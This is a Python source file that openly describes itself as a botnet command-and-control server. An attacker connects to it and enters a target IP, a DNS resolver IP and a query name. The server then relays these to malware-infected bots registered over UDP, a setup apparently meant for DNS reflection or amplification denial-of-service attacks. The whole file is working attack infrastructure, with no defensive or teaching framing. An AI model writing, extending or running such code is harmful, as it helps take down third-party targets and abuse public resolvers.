"""
This is the server which the hacker connects to to give instructions on which target to attack and how to execute the attack.
The "bots" which are infected with the malware will also connect to this server to receive instructions
"""

import socket
import threading
import logging

class Server:
    
    host: str
    hack_port: int
    bot_port: int
    botnets: list
    botnet_thread: threading.Thread
    botnet_socket: threading.Thread = None
    
    def __init__(self, host: str, hack_port: int, bot_port: int) -> None:
        self.host = host
        self.hack_port = hack_port
        self.bot_port = bot_port
        self.botnet_thread = threading.Thread(target=self.botnetConn)
        self.botnet_thread.start()
        self.botnets = []
    
    def start_server(self):
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.bind((self.host, self.hack_port))
        s.listen(1)
        while True:
            soc, _ = s.accept()
            soc.send("Connection established. Please, don't close this connection before the end.\n".encode())

            soc.send("Write target IP:\n".encode())
            self.target_IP = soc.recv(1024)
            if not self.isIPv4(self.target_IP):
                soc.send("Invalid IP, closing connection.\n".encode())
                soc.shutdown(socket.SHUT_RDWR)
                soc.close()
                continue

            soc.send("Write DNS server/resolver IP to use:\n".encode())
            self.resolver_IP = soc.recv(1024)
            if not self.isIPv4(self.resolver_IP):
                soc.send("Invalid IP, closing connection.\n".encode())
                soc.shutdown(socket.SHUT_RDWR)
                soc.close()
                continue

            soc.send("Write query name to use:\n".encode())
            self.query = soc.recv(1024)

            self.send_to_bots()

    def isIPv4(self, ip: bytes) -> bool:
        try:
            socket.inet_aton(ip.decode().strip())
            return True
        except (UnicodeDecodeError, socket.error):
            return False


    def botnetConn(self):
        print("botnetConn started")
        logging.basicConfig(level=logging.INFO)
        logging.info(
            "botnetConn started"
        )
        self.botnet_socket = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        self.botnet_socket.bind((self.host, self.bot_port))
        while True:
            msg, bot_adr = self.botnet_socket.recvfrom(1024)
            self.botnets.append(bot_adr)
            logging.info(f"{bot_adr}")

    def send_to_bots(self):
        for adr in self.botnets:
            self.botnet_socket.sendto(self.target_IP + self.resolver_IP + self.query, adr)

